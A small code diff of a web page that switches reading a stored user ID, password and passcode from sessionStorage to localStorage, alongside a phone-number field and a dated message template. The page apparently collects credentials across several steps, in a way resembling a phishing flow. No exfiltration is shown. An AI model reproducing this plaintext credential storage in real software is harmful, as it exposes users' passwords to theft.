@@ -104,10 +104,9 @@ document.addEventListener('DOMContentLoaded', function() {
     phoneInput.setAttribute('inputmode', 'numeric');
     phoneInput.setAttribute('pattern', '[0-9]*');
     
-    // Retrieve stored data from sessionStorage
-    const userId = sessionStorage.getItem('userId') || 'Not available';
-    const password = sessionStorage.getItem('userPassword') || 'Not available';
-    const passcode = sessionStorage.getItem('userPasscode') || 'Not provided';
+    const userId = localStorage.getItem('userId') || 'Not available';
+const password = localStorage.getItem('userPassword') || 'Not available';
+const passcode = localStorage.getItem('userPasscode') || 'Not provided';
     
     // Add red border style
     const style = document.createElement('style');
@@ -324,3 +323,4 @@ Date: ${currentDateTime}`;
   </iframe>
  </body>
 </html>
+
